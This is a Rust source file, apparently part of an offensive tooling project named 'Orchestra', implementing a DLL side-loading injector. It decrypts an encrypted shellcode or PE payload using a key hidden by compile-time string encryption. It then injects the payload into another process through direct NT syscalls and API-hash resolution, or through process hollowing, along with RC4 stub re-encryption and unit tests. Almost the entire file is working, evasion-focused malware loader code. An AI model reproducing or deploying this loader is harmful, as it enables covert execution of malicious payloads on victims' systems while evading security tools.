/// DLL side-loading injection (S-05) — encrypted payload loader.
///
/// Accepts an XChaCha20-Poly1305 encrypted payload blob, decrypts it using
/// a key derived from a build-time constant (embedded via `string_crypt::enc_str!`),
/// and injects the payload into a remote process using direct NT syscalls.
///
/// **Injection flow:**
///   1. Derive the decryption key from a build-time seed via `enc_str!`.
///   2. Decrypt the outer XChaCha20-Poly1305 layer → plaintext shellcode or PE.
///   3. Open the target process via `NtOpenProcess`.
///   4. Allocate RW- memory via `NtAllocateVirtualMemory`.
///   5. Write the payload via `NtWriteVirtualMemory`.
///   6. Change protection to R-X via `NtProtectVirtualMemory`.
///   7. Flush the instruction cache.
///   8. Execute via `NtCreateThreadEx`.
///
/// **PE payloads** fall back to process hollowing (`hollowing::inject_into_process`),
/// which handles the more complex PE relocation and mapping internally.
///
/// **Encrypted payload blob format (input):**
///   `[24-byte XChaCha20 nonce][16-byte Poly1305 tag][ciphertext]`
///
/// **Key derivation:**
///   The 32-byte XChaCha20-Poly1305 key is derived from a build-time seed
///   using FNV-1a hashing and SplitMix64 expansion — the same approach used
///   by the `string_crypt` crate for compile-time string encryption.
///
/// **Export forwarding / DLL generation:**
///   The `ExportConfig` struct is provided for build-time DLL generation tools
///   (e.g., `orchestra-side-load-gen`) that produce side-loaded DLLs with
///   legitimate-looking export tables.  At runtime, the injector writes
///   the decrypted payload directly into the target process without touching
///   disk.
///
/// **Multi-architecture:**
///   The injector itself is architecture-independent (it uses indirect syscalls
///   resolved at runtime).  The injected payload must match the target process
///   architecture (x86 or x64).
#[cfg(any(windows, test))]
use anyhow::{anyhow, Result};

pub struct DllSideLoadInjector;

/// Configuration for export forwarding in a side-loaded DLL.
///
/// Used by build-time tools (e.g. `orchestra-side-load-gen`) to generate
/// DLLs with legitimate-looking export tables that forward to the real DLL.
#[derive(Clone, Default)]
pub struct ExportConfig {
    /// Name of the real DLL to forward exports to (e.g. `"version.dll"`).
    pub forward_target: String,
    /// Named exports to forward (e.g. `["GetFileVersionInfoA"]`).
    pub named_exports: Vec<String>,
    /// Ordinal-only exports: `(ordinal, internal_name)`.
    pub ordinal_exports: Vec<(u16, String)>,
}

// ── Key derivation ────────────────────────────────────────────────────────────
//
// Derives a 32-byte XChaCha20-Poly1305 key from a build-time seed constant
// using FNV-1a hashing and SplitMix64 expansion.  The seed is embedded via
// `string_crypt::enc_str!` so the key is not visible as a plain string in
// the binary.

/// Derive the 32-byte payload decryption key from the build-time seed.
#[cfg(any(windows, test))]
fn derive_payload_key() -> [u8; 32] {
    // Build-time seed constant — encrypted at compile time by string_crypt.
    let seed_bytes = string_crypt::enc_str!("ORCHESTRA_PAYLOAD_KEY_SEED");
    derive_key_from_seed(&seed_bytes, b"payload_encryption_key_v1")
}

/// Derive a 16-byte RC4 key (used for re-encryption in the stub data block).
#[allow(dead_code)]
fn derive_stub_rc4_key() -> [u8; 16] {
    let seed_bytes = string_crypt::enc_str!("ORCHESTRA_PAYLOAD_KEY_SEED");
    let full = derive_key_from_seed(&seed_bytes, b"stub_rc4_key_v1");
    let mut key = [0u8; 16];
    key.copy_from_slice(&full[..16]);
    key
}

/// Generic key derivation: FNV-1a over seed + label, then SplitMix64 expansion.
fn derive_key_from_seed(seed: &[u8], label: &[u8]) -> [u8; 32] {
    // FNV-1a hash over seed || label
    let mut state: u64 = 0xcbf29ce484222325u64;
    for &b in seed {
        if b == 0 {
            break;
        }
        state ^= b as u64;
        state = state.wrapping_mul(0x100000001b3);
    }
    for &b in label {
        state ^= b as u64;
        state = state.wrapping_mul(0x100000001b3);
    }
    // Ensure non-zero
    if state == 0 {
        state = 0x9e3779b97f4a7c15;
    }

    // SplitMix64 to expand into 4 × u64 = 32 bytes
    const SM64_GAMMA: u64 = 0x9E3779B97F4A7C15;
    const SM64_M1: u64 = 0xBF58476D1CE4E5B9;
    const SM64_M2: u64 = 0x94D049BB133111EB;
    let mut sm = state;
    let mut key = [0u8; 32];
    for chunk in key.chunks_mut(8) {
        sm = sm.wrapping_add(SM64_GAMMA);
        let mut z = sm;
        z = (z ^ (z >> 30)).wrapping_mul(SM64_M1);
        z = (z ^ (z >> 27)).wrapping_mul(SM64_M2);
        z = z ^ (z >> 31);
        chunk.copy_from_slice(&z.to_le_bytes());
    }
    key
}

// ── XChaCha20-Poly1305 decryption ─────────────────────────────────────────────

/// Decrypt an XChaCha20-Poly1305 encrypted payload blob.
///
/// Input format: `[24-byte nonce][16-byte tag][ciphertext]`
#[cfg(any(windows, test))]
fn decrypt_xchacha20_payload(encrypted_blob: &[u8], key: &[u8; 32]) -> Result<Vec<u8>> {
    use chacha20poly1305::{
        aead::{Aead, KeyInit},
        XChaCha20Poly1305, XNonce,
    };
    if encrypted_blob.len() < 40 {
        return Err(anyhow!(
            "encrypted blob too short (need ≥40 bytes for nonce+tag, got {})",
            encrypted_blob.len()
        ));
    }
    let nonce = XNonce::from_slice(&encrypted_blob[..24]);
    let ciphertext_with_tag = &encrypted_blob[24..];
    let cipher = XChaCha20Poly1305::new(key.into());
    cipher
        .decrypt(nonce, ciphertext_with_tag)
        .map_err(|e| anyhow!("XChaCha20-Poly1305 decryption failed: {e}"))
}

// ── RC4 with 3072-byte initial drop ──────────────────────────────────────────
// Same algorithm as string_crypt method 1, used for build-time re-encryption
// of the payload when embedding in a side-loaded DLL.

struct Rc4State {
    s: [u8; 256],
    i: usize,
    j: usize,
}

impl Rc4State {
    fn new(key: &[u8]) -> Self {
        let mut s = [0u8; 256];
        for (i, b) in s.iter_mut().enumerate() {
            *b = i as u8;
        }
        let mut j: usize = 0;
        for i in 0..=255 {
            j = (j.wrapping_add(s[i] as usize).wrapping_add(key[i % key.len()] as usize)) % 256;
            s.swap(i, j);
        }
        let mut state = Rc4State { s, i: 0, j: 0 };
        // 3072-byte initial drop to mitigate known biases (same as string_crypt).
        let mut discard = [0u8; 3072];
        state.process_in_place(&mut discard);
        state
    }

    fn process_in_place(&mut self, data: &mut [u8]) {
        for b in data.iter_mut() {
            self.i = (self.i.wrapping_add(1)) % 256;
            self.j = (self.j.wrapping_add(self.s[self.i] as usize)) % 256;
            self.s.swap(self.i, self.j);
            let k = self.s
                [(self.s[self.i] as usize).wrapping_add(self.s[self.j] as usize) % 256];
            *b ^= k;
        }
    }
}

/// RC4 encrypt/decrypt (symmetric operation).
#[allow(dead_code)]
fn rc4_encrypt(plaintext: &[u8], key: &[u8]) -> Vec<u8> {
    let mut ct = plaintext.to_vec();
    Rc4State::new(key).process_in_place(&mut ct);
    ct
}

// ══════════════════════════════════════════════════════════════════════════════
//  WINDOWS IMPLEMENTATION
// ══════════════════════════════════════════════════════════════════════════════

#[cfg(windows)]
impl crate::injection::Injector for DllSideLoadInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        use crate::injection::payload_has_valid_pe_headers;
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
        use winapi::um::winnt::{
            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
            PROCESS_VM_READ, PROCESS_VM_WRITE, SYNCHRONIZE,
        };

        let is_pe = payload_has_valid_pe_headers(payload);

        // ── 1. Derive the decryption key from the build-time seed ──────────
        let key = derive_payload_key();

        // ── 2. Decrypt the XChaCha20-Poly1305 outer layer ──────────────────
        let plaintext = decrypt_xchacha20_payload(payload, &key)?;

        // ── 3. PE payloads: fall back to process hollowing ─────────────────
        if is_pe {
            return hollowing::inject_into_process(pid, &plaintext)
                .map_err(|e| anyhow!("DllSideLoad: in-memory PE injection failed: {e}"));
        }

        // ── 4. Open target process via NtOpenProcess ───────────────────────
        let mut client_id = [0u64; 2];
        client_id[0] = pid as u64;
        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES =
            unsafe { std::mem::zeroed() };
        obj_attr.Length =
            std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

        let mut h_proc: usize = 0;
        let access_mask = (PROCESS_VM_OPERATION
            | PROCESS_VM_WRITE
            | PROCESS_VM_READ
            | PROCESS_CREATE_THREAD
            | PROCESS_QUERY_INFORMATION) as u64;
        let open_status = unsafe {
            nt_syscall::syscall!(
                "NtOpenProcess",
                &mut h_proc as *mut _ as u64,
                access_mask,
                &mut obj_attr as *mut _ as u64,
                client_id.as_mut_ptr() as u64,
            )
        };
        match open_status {
            Ok(s) if s >= 0 && h_proc != 0 => {}
            _ => return Err(anyhow!("DllSideLoad: NtOpenProcess(pid={pid}) failed")),
        }
        let h_proc = h_proc as *mut std::ffi::c_void;

        macro_rules! close_h {
            ($h:expr) => {
                nt_syscall::syscall!("NtClose", $h as u64).ok();
            };
        }
        macro_rules! cleanup_and_err {
            ($msg:expr) => {{
                close_h!(h_proc);
                return Err(anyhow!($msg));
            }};
        }

        // ── 5. Resolve NtCreateThreadEx via PEB walk ──────────────────────
        let ntdll_base = unsafe {
            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
        }
        .ok_or_else(|| {
            close_h!(h_proc);
            anyhow!("ntdll not found")
        })?;

        let ntcreate_addr = unsafe {
            pe_resolve::get_proc_address_by_hash(
                ntdll_base,
                pe_resolve::hash_str(b"NtCreateThreadEx\0"),
            )
        }
        .ok_or_else(|| {
            close_h!(h_proc);
            anyhow!("NtCreateThreadEx not found")
        })?;

        type NtCreateThreadExFn = unsafe extern "system" fn(
            *mut *mut std::os::raw::c_void,
            u32,
            *mut std::os::raw::c_void,
            *mut std::os::raw::c_void,
            *mut std::os::raw::c_void,
            *mut std::os::raw::c_void,
            u32,
            usize,
            usize,
            usize,
            *mut std::os::raw::c_void,
        ) -> i32;
        let nt_create_thread: NtCreateThreadExFn =
            unsafe { std::mem::transmute(ntcreate_addr) };

        // ── 6. Allocate RW- memory in the target process ──────────────────
        let mut remote_payload: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut alloc_size = plaintext.len();
        let s = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut remote_payload as *mut _ as u64,
            0u64,
            &mut alloc_size as *mut _ as u64,
            (MEM_COMMIT | MEM_RESERVE) as u64,
            PAGE_READWRITE as u64,
        );
        if let Ok(st) = s {
            if st < 0 || remote_payload.is_null() {
                cleanup_and_err!(
                    "DllSideLoad: NtAllocateVirtualMemory for shellcode payload failed"
                );
            }
        } else {
            cleanup_and_err!(
                "DllSideLoad: NtAllocateVirtualMemory for shellcode payload failed"
            );
        }

        // ── 7. Write the decrypted payload ────────────────────────────────
        let mut written = 0usize;
        let write_ok = match nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            remote_payload as u64,
            plaintext.as_ptr() as u64,
            plaintext.len() as u64,
            &mut written as *mut _ as u64,
        ) {
            Ok(s) => s >= 0 && written == plaintext.len(),
            Err(_) => false,
        };
        if !write_ok {
            let mut free_base = remote_payload as usize;
            let mut free_size = 0usize;
            nt_syscall::syscall!(
                "NtFreeVirtualMemory",
                h_proc as u64,
                &mut free_base as *mut _ as u64,
                &mut free_size as *mut _ as u64,
                0x8000u64,
            )
            .ok();
            cleanup_and_err!("DllSideLoad: NtWriteVirtualMemory for shellcode failed");
        }

        // ── 8. Change protection to R-X ───────────────────────────────────
        let mut old_protect = 0u32;
        let mut prot_base = remote_payload as usize;
        let mut prot_size = plaintext.len();
        let protect_ok = match nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            h_proc as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            PAGE_EXECUTE_READ as u64,
            &mut old_protect as *mut _ as u64,
        ) {
            Ok(s) => s >= 0,
            Err(_) => false,
        };
        if !protect_ok {
            let mut free_base = remote_payload as usize;
            let mut free_size = 0usize;
            nt_syscall::syscall!(
                "NtFreeVirtualMemory",
                h_proc as u64,
                &mut free_base as *mut _ as u64,
                &mut free_size as *mut _ as u64,
                0x8000u64,
            )
            .ok();
            cleanup_and_err!("DllSideLoad: NtProtectVirtualMemory to RX failed");
        }

        // ── 9. Flush instruction cache ────────────────────────────────────
        nt_syscall::syscall!(
            "NtFlushInstructionCache",
            h_proc as u64,
            remote_payload as u64,
            plaintext.len() as u64,
        )
        .ok();

        // ── 10. Execute via NtCreateThreadEx ───────────────────────────────
        let mut h_thread: *mut std::os::raw::c_void = std::ptr::null_mut();
        let status = unsafe {
            nt_create_thread(
                &mut h_thread,
                SYNCHRONIZE,
                std::ptr::null_mut(),
                h_proc,
                remote_payload,
                std::ptr::null_mut(),
                0,
                0,
                0,
                0,
                std::ptr::null_mut(),
            )
        };
        if status < 0 || h_thread.is_null() {
            let mut free_base = remote_payload as usize;
            let mut free_size = 0usize;
            nt_syscall::syscall!(
                "NtFreeVirtualMemory",
                h_proc as u64,
                &mut free_base as *mut _ as u64,
                &mut free_size as *mut _ as u64,
                0x8000u64,
            )
            .ok();
            cleanup_and_err!(
                "DllSideLoad: NtCreateThreadEx for shellcode failed: {status:#x}"
            );
        }

        close_h!(h_thread);
        close_h!(h_proc);

        tracing::info!(
            pid,
            size = plaintext.len(),
            "DllSideLoad: decrypted payload injected in-memory via XChaCha20 + NT syscalls"
        );
        Ok(())
    }
}

// ══════════════════════════════════════════════════════════════════════════════
//  TESTS (cross-platform)
// ══════════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_derive_payload_key_is_deterministic() {
        let key1 = derive_payload_key();
        let key2 = derive_payload_key();
        assert_eq!(key1, key2, "derive_payload_key must be deterministic");
        assert_ne!(key1, [0u8; 32], "key must not be all zeros");
    }

    #[test]
    fn test_derive_stub_rc4_key_is_deterministic() {
        let key1 = derive_stub_rc4_key();
        let key2 = derive_stub_rc4_key();
        assert_eq!(key1, key2, "derive_stub_rc4_key must be deterministic");
        assert_ne!(key1, [0u8; 16], "key must not be all zeros");
    }

    #[test]
    fn test_payload_key_and_rc4_key_differ() {
        let payload_key = derive_payload_key();
        let rc4_key = derive_stub_rc4_key();
        assert_ne!(
            &payload_key[..16],
            rc4_key.as_slice(),
            "different labels must produce different keys"
        );
    }

    #[test]
    fn test_derive_key_from_seed_different_labels() {
        let seed = b"test_seed";
        let k1 = derive_key_from_seed(seed, b"label_a");
        let k2 = derive_key_from_seed(seed, b"label_b");
        assert_ne!(k1, k2, "different labels → different keys");
    }

    #[test]
    fn test_derive_key_from_seed_deterministic() {
        let seed = b"test_seed";
        let k1 = derive_key_from_seed(seed, b"test_label");
        let k2 = derive_key_from_seed(seed, b"test_label");
        assert_eq!(k1, k2, "same inputs → same key");
    }

    #[test]
    fn test_rc4_roundtrip() {
        let key = b"test_rc4_key_1234";
        let plaintext = b"Hello, RC4! This is a test payload.";
        let encrypted = rc4_encrypt(plaintext, key);
        assert_ne!(encrypted.as_slice(), plaintext);
        let decrypted = rc4_encrypt(&encrypted, key);
        assert_eq!(decrypted.as_slice(), plaintext);
    }

    #[test]
    fn test_rc4_empty_payload() {
        let key = b"testkey";
        let encrypted = rc4_encrypt(b"", key);
        assert!(encrypted.is_empty());
    }

    #[test]
    fn test_rc4_different_keys_different_output() {
        let plaintext = b"same input data";
        let enc1 = rc4_encrypt(plaintext, b"key1");
        let enc2 = rc4_encrypt(plaintext, b"key2");
        assert_ne!(enc1, enc2);
    }

    #[test]
    fn test_rc4_deterministic() {
        let key = b"deterministic_key";
        let plaintext = b"deterministic test data";
        let enc1 = rc4_encrypt(plaintext, key);
        let enc2 = rc4_encrypt(plaintext, key);
        assert_eq!(enc1, enc2);
    }

    #[test]
    fn test_decrypt_too_short_blob_returns_error() {
        let key = [0u8; 32];
        let short_blob = [0u8; 20]; // < 40 bytes
        let result = decrypt_xchacha20_payload(&short_blob, &key);
        assert!(result.is_err());
    }

    #[test]
    fn test_decrypt_invalid_blob_returns_error() {
        let key = [0u8; 32];
        let blob = vec![0xAA; 100]; // valid length, but not a valid ciphertext
        let result = decrypt_xchacha20_payload(&blob, &key);
        assert!(result.is_err());
    }

    #[test]
    fn test_xchacha20_encrypt_decrypt_roundtrip() {
        use chacha20poly1305::aead::rand_core::RngCore;
        use chacha20poly1305::{
            aead::{Aead, KeyInit, OsRng},
            XChaCha20Poly1305, XNonce,
        };

        let key_bytes: [u8; 32] = derive_payload_key();
        let cipher = XChaCha20Poly1305::new(&key_bytes.into());

        let mut nonce_bytes = [0u8; 24];
        OsRng.fill_bytes(&mut nonce_bytes);
        let nonce = XNonce::from_slice(&nonce_bytes);

        let plaintext = b"This is a test payload for XChaCha20-Poly1305 roundtrip.";
        let ciphertext = cipher.encrypt(nonce, plaintext.as_slice()).unwrap();

        // Build the blob: [nonce][tag+ciphertext]
        let mut blob = Vec::with_capacity(24 + ciphertext.len());
        blob.extend_from_slice(&nonce_bytes);
        blob.extend_from_slice(&ciphertext);

        let decrypted = decrypt_xchacha20_payload(&blob, &key_bytes).unwrap();
        assert_eq!(decrypted, plaintext.as_slice());
    }

    #[test]
    fn test_export_config_default() {
        let config = ExportConfig::default();
        assert!(config.forward_target.is_empty());
        assert!(config.named_exports.is_empty());
        assert!(config.ordinal_exports.is_empty());
    }

    #[test]
    fn test_export_config_with_values() {
        let config = ExportConfig {
            forward_target: "version.dll".to_string(),
            named_exports: vec!["GetFileVersionInfoA".to_string()],
            ordinal_exports: vec![(1, "GetFileVersionInfoByHandle".to_string())],
        };
        assert_eq!(config.forward_target, "version.dll");
        assert_eq!(config.named_exports.len(), 1);
        assert_eq!(config.ordinal_exports.len(), 1);
    }
}
